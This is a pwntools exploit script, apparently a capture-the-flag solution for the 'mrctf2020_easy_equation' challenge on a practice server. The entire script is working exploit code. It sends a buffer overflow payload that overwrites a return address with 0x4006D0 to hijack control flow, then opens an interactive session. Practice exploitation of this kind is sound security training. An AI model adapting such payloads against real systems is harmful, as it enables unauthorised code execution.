#+++++++++++++++++++exp.py++++++++++++++++++++
# -*- coding:utf-8 -*-                           
#Author: Squarer
#Time: Thu Jan 28 10:49:20 CST 2021
#+++++++++++++++++++exp.py++++++++++++++++++++
from pwn import*

context.log_level = 'debug'
context.arch = 'amd64'

elf = ELF('./mrctf2020_easy_equation')
#libc = ELF('null')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')

sh = process('./mrctf2020_easy_equation')
sh = remote('node3.buuoj.cn',27283)

payload = 'A'*0x9 + p64(0x00000000004006D0)
sh.sendline(payload)
#gdb.attach(sh)


sh.interactive()
